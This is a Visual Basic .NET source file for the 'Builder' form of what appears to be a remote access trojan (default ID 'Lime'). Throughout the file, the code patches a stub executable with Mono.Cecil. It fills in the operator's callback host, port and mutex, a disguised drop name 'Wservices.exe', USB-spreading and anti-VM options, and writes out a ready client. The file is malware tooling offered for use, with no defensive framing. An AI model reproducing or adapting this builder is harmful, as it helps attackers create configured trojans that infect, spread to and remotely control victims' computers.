Imports System.IO
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports System.Security.Cryptography

Public Class Builder

    Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button1.Click


        If (host2.Text = "") Then
            host2.Text = ""
        End If
        If (exename.Text = "") Then
            exename.Text = "Wservices.exe"
        End If

        If DRPATH.Text = "" Then
            DRPATH.Text = "Temp"
        End If

        If IO.Path.GetExtension(exename.Text) <> ".exe" Then
            exename.Text = exename.Text + ".exe"
        End If

        If (DRFOLDER.Text = "") Then
            DRFOLDER.Text = Nothing
        End If
        If NumericUpDown1.Text = "" Or Nothing Then
            NumericUpDown1.Text = "0"
        End If

        If vn.Text = "" Then
            vn.Text = "Lime"
        End If

        If Not File.Exists((Application.StartupPath & "\Stub\stub.exe")) Then
            Interaction.MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
            Return
        ElseIf (host.Text = "") Then
            Interaction.MsgBox("Enter DNS - IP", MsgBoxStyle.Critical, Nothing)
            Return
        ElseIf (port.Text = "") Then
            Interaction.MsgBox("Enter Port", MsgBoxStyle.Critical, Nothing)
            Return
        ElseIf (TextBox2.Text = "") Then
            Interaction.MsgBox("No Mutex", MsgBoxStyle.Critical, Nothing)
            Return
        Else
            Try
                Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\Stub\stub.exe"))
                Dim definition2 As ModuleDefinition
                For Each definition2 In definition.Modules
                    Dim definition3 As TypeDefinition
                    For Each definition3 In definition2.Types
                        Dim definition4 As MethodDefinition
                        For Each definition4 In definition3.Methods
                            If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                                Dim enumerator As IEnumerator(Of Instruction)
                                Try
                                    enumerator = definition4.Body.Instructions.GetEnumerator
                                    Do While enumerator.MoveNext
                                        Dim current As Instruction = enumerator.Current
                                        If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                            Dim str As String = current.Operand.ToString
                                            If (str = "%LHOST%") Then
                                                current.Operand = host.Text
                                            End If
                                            If (str = "%LHOST2%") Then
                                                current.Operand = host2.Text
                                            End If
                                            If (str = "%LPORT%") Then
                                                current.Operand = port.Text
                                            End If
                                            If (str = "%Xsec%") Then
                                                current.Operand = NumericUpDown1.Text
                                            End If
                                            If (str = "%LID%") Then
                                                current.Operand = vn.Text
                                            End If
                                            If (str = "%STNAME%") Then
                                                current.Operand = getMD5Hash(File.ReadAllBytes(Application.StartupPath & "\Stub" & "\stub.exe"))
                                            End If
                                            If (str = "%LEXE%") Then
                                                current.Operand = exename.Text
                                            End If
                                            If (str = "%DRPATH%") Then
                                                current.Operand = DRPATH.Text
                                            End If
                                            If (str = "%DRCHK%") Then
                                                current.Operand = CHKDR.Checked.ToString
                                            End If
                                            If (str = "%DRFOLDER%") Then
                                                current.Operand = DRFOLDER.Text
                                            End If
                                            If (str = "%SPUSB%") Then
                                                current.Operand = SPUSB.Checked.ToString
                                            End If
                                            If (str = "%ANTIV%") Then
                                                current.Operand = ANTI_VM.Checked.ToString
                                            End If
                                            If (str = "%MUTEX%") Then
                                                current.Operand = TextBox2.Text
                                            End If
                                        End If
                                    Loop
                                Finally
                                End Try
                            End If
                        Next
                    Next
                Next

                definition.Write(Application.StartupPath + "\" + "Controller-Client.exe")
                MsgBox("Your Controller Has been Created Successfully", vbInformation, "DONE!")
                Me.Close()

            Catch ex1 As Exception
                MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
                Return
            End Try
        End If

    End Sub

    Public Function Randomisi(ByVal lenght As Integer) As String
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()".ToCharArray()
        For i As Integer = 1 To lenght
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function

    Public Shared Function getMD5Hash(ByVal B As Byte()) As String
        B = New MD5CryptoServiceProvider().ComputeHash(B)
        Dim str2 As String = ""
        Dim num As Byte
        For Each num In B
            str2 = (str2 & num.ToString("x2"))
        Next
        Return str2
    End Function

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.Close()
    End Sub

    Private Sub CHKDR_CheckedChanged(sender As Object, e As EventArgs) Handles CHKDR.CheckedChanged
        If CHKDR.Checked = True Then
            exename.Enabled = True
            DRPATH.Enabled = True
        Else
            exename.Enabled = False
            DRPATH.Enabled = False
        End If
    End Sub


    Private Sub Button3_Click_1(sender As Object, e As EventArgs) Handles Button3.Click
        TextBox2.Text = Randomisi(10)
        MsgBox("New mutex created! Try not to change it often", MsgBoxStyle.Information)
    End Sub

    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.port.Text = Form1.Myport
        exename.Enabled = False
        DRPATH.Enabled = False
        CHKDR.Checked = False
    End Sub
End Class